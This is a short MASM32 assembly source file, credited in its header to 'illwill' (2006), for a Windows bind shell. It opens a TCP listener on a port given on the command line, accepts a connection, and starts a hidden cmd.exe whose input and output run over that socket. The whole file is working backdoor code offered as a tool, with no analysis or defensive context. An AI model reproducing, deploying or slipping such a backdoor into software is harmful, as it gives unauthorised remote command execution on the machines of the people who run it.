; minishell.asm
; by illwill
; feb 22,2006
; a shell in masm that listens on a port 
; and spits back a cmd shell

.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\ws2_32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\ws2_32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib 

.data
  cmd     db "cmd",0
.data?
  sinfo   STARTUPINFO<>
  pi      PROCESS_INFORMATION<>
  sin     sockaddr_in<>
  WSAD    WSADATA<>
  Wsocket dd ?
  port    db 8 dup (?)
.code
start:
    invoke GetCL,1,addr port
    invoke WSAStartup, 101h, addr WSAD 
    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0
           mov Wsocket, eax
           mov sin.sin_family, 2
    invoke atodw, addr port
    invoke htons, eax
           mov sin.sin_port, ax
           mov sin.sin_addr,INADDR_ANY
   invoke bind, Wsocket, addr sin , sizeof(sockaddr_in)
   invoke listen, Wsocket, 5
   invoke accept,Wsocket,0,0 
          mov Wsocket,eax
          mov eax,Wsocket
          mov sinfo.hStdInput,eax
          mov sinfo.hStdOutput,eax
          mov sinfo.hStdError,eax     
          mov sinfo.cb,sizeof STARTUPINFO
          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
   invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi
 ;  invoke WaitForSingleObject,pi.hProcess,INFINITE
 ;  invoke closesocket,Wsocket
 ;  invoke WSACleanup
 ret
 end start